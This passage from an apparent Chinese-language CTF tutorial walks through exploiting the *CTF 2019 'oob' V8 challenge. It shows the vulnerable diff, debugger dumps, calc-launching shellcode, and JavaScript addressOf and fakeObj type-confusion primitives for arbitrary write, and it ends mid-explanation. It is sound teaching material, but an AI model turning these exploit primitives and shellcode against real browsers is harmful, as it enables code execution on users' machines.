class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="类型混淆利用模板"><a href="#类型混淆利用模板" class="headerlink" title="类型混淆利用模板"></a>类型混淆利用模板</h2><p>这里先给出一些方便类型混淆漏洞利用的模板，在后面编写 <code>exp</code> 时会用上  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和文章一开始说的一样，环境用的是 <code>*CTF 2019</code> 的 <code>oob</code>。题目给了一个 <code>diff</code> 文件：  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>嗯。。。。。。，好像看的不太懂，这里简单解释一下<br>这里主要是出题人为 <code>array</code> 定义了一个 <code>oob</code> 函数，其函数的功能如下：  </p><ul><li>获取参数的数量，然后根据参数个数进行不同的操作  </li><li>如果参数数量大于 <code>2</code> 则直接抛出 <code>undefined</code>  </li><li>如果参数数量小于等于 <code>2</code>，则先把 <code>array</code> 转成 <code>doublearray</code>  </li><li>然后判断如果无额外参数（第一个是 <code>this</code>），则是 <code>read</code> 功能，返回 <code>array[length]</code>  </li><li>如果传入了一个参数，则是 <code>write</code> 功能，将 <code>value</code> 写入到 <code>doublearray[length]</code> 中</li></ul><p>这里的漏洞还是挺好发现了，我们知道 <code>array</code> 最后一个元素的索引为 <code>length - 1</code>， 而这里可以索引到 <code>length</code>，也就是说我们可以在 <code>elements</code> 中越界读和写一个索引的数据<br>在上面的分析中我们知道 <code>elements</code> 是在 <code>obj</code> 的上方的，当时我也说过 <code>elements</code> 并不一定紧贴着 <code>obj</code> 的，现在我就来分析一下这个问题。<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x20bd84310ab9 &lt;JSArray[4]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x20bd84310ab9</span><br><span class="line">0x20bd84310ab9: [JSArray]</span><br><span class="line"> - map: 0x273506142d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02e1c7e51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10c0b3540c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x15d18a8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x20bd84310a41</span><br><span class="line">00:0000│  0x20bd84310a41 ◂— 0x10c0b35408</span><br><span class="line">01:0008│  0x20bd84310a49 ◂— 0x4000000</span><br><span class="line">02:0010│  0x20bd84310a51 ◂— 0x1000000</span><br><span class="line">03:0018│  0x20bd84310a59 ◂— 0x2000000</span><br><span class="line">04:0020│  0x20bd84310a61 ◂— 0x3000000</span><br><span class="line">05:0028│  0x20bd84310a69 ◂— 0x5100000004000000</span><br><span class="line">06:0030│  0x20bd84310a71 ◂— 0x10c0b35408</span><br><span class="line">07:0038│  0x20bd84310a79 ◂— 0x2900000004000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>怪，可以看见在 <code>elements</code> 到 <code>obj</code> 的中间存在一些数据，于是我好奇去看看这是什么东西  </p><img src="/2024/05/05/v8start/8.png" class="" title="我的图图呢">  <p>好家伙，居然还会存在一个别的结构。算了，这不是我这个初学者该了解的东西，等学深入了再研究吧，暂时不影响解题<br>既然全为整数的 <code>array</code> 的 <code>elements</code> 无法紧贴着 <code>obj</code>，那存在浮点数的 <code>array</code> 呢？<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>运行结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x116059b90b21 &lt;JSArray[4]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x116059b90b21</span><br><span class="line">0x116059b90b21: [JSArray]</span><br><span class="line"> - map: 0x0ce399302ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07fe97a11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3ffe4d400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x062d803001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x116059b90af1</span><br><span class="line">00:0000│  0x116059b90af1 ◂— 0x3ffe4d4014</span><br><span class="line">01:0008│  0x116059b90af9 ◂— 0x9a00000004000000</span><br><span class="line">02:0010│  0x116059b90b01 ◂— 0x9a3ff19999999999</span><br><span class="line">03:0018│  0x116059b90b09 ◂— 0x40019999999999</span><br><span class="line">04:0020│  0x116059b90b11 ◂— 0x40080000000000</span><br><span class="line">05:0028│  0x116059b90b19 ◂— 0xd940100000000000</span><br><span class="line">06:0030│  0x116059b90b21 ◂— 0x7100000ce399302e</span><br><span class="line">07:0038│  0x116059b90b29 ◂— 0xf100003ffe4d400c</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见带浮点数数组的 <code>elements</code> 是紧贴着 <code>obj</code> 的，这符合我们漏洞的利用<br>首先尝试利用一下能否利用该漏洞来泄露出 <code>obj</code> 中 <code>map</code> 的值  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="built_in">float</span> array map: 0x000029e6d51c2ed9</span><br><span class="line">0x133632fd10b1 &lt;JSArray[1]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x133632fd10b1</span><br><span class="line">0x133632fd10b1: [JSArray]</span><br><span class="line"> - map: 0x29e6d51c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1dc4905d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x097d61840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3faa656801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们已经成功的泄露出了 <code>map</code>。同理，我们也可以用类似的方法去修改 <code>map</code><br>为了能够在 <code>WASM</code> 上写入我们的 <code>shellcode</code>，我们需要任意地址写和地址泄露，这时候就需要用到类型混淆  </p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>在上面已经说过，<code>v8</code> 是通过 <code>map</code> 所指向的区域来判断该对象是什么类型，也就是说，如果我们吧一个存储 <code>obj</code> 的 <code>array</code> 的 <code>map</code> 修改为存在浮点数数组的 <code>map</code>，这时候我们就能够直接获取到该对象的地址。我们可以将该原语封装成一个 <code>addressOf</code> 函数  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>addressOf</code> 函数的功能为获取指定对象 <code>obj</code> 的地址，建议读者仔细阅读和理解该函数的实现原理<br>同理，我们也可以用类似的思路来实现任意地址的写，不过有一点点绕  </p><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>任意地址写的思想为伪造一个 <code>object</code>，根据类型混淆可以将该原语封装成一个函数：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还是希望读者可以自行思考和理解该原语是如何实现伪造 <code>object</code> 的。<br>我们伪造的 <code>object</code> 是在 <code>elements</code> 上面的，而 <code>elements</code> 上的数据是可控的，我们可以按照如下样式伪造一个存在浮点数的 <code>object</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(target - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这里伪造的是一个没有原型的存在浮点数的 <code>objcet</code>，<code>target</code> 为我们想要进行写的地址，也就是伪造的 <code>elements</code><br>我们可以在泄露出 <code>float_array_mem</code> 的地址后通过 <code>fakeObj(fake_obj_addr)</code> 函数来获取我们的 <code>fake object</code>，然后向 <code>target</code> 写入数据。至于为什么 <code>target</code> 要 <code>-0x10</code> 呢，因为 <code>elements</code> 上面有 <code>0x10</code> 字节用于存储 <code>map</code> 和 <code>length</code><br>有了对象地址泄露和任意地址写，我们就以为能够在 <code>WASM</code> 上愉快的写 <code>shellcode</code> 了，可事情并没有这么简单，即在写 <code>0x7fxxxxx</code> 这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。因为写原语使用的是 <code>FloatArray</code> 的写入操作，而 <code>Double</code> 类型的浮点数数组在处理 <code>7f</code> 开头的高地址时会出现将低 <code>20</code> 位与运算为 <code>0</code><br>这时候我们就要使用 <code>DataView </code>对象，该对象的结构如下：  </p><img src="/2024/05/05/v8start/9.png" class="" title="我的图图呢">  <p>这是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 的内容的对象，在 <code>exploit</code> 里常用作最后的任意地址读写原语的构造。<br>可以看见这个 <code>DataView</code> 多了一个 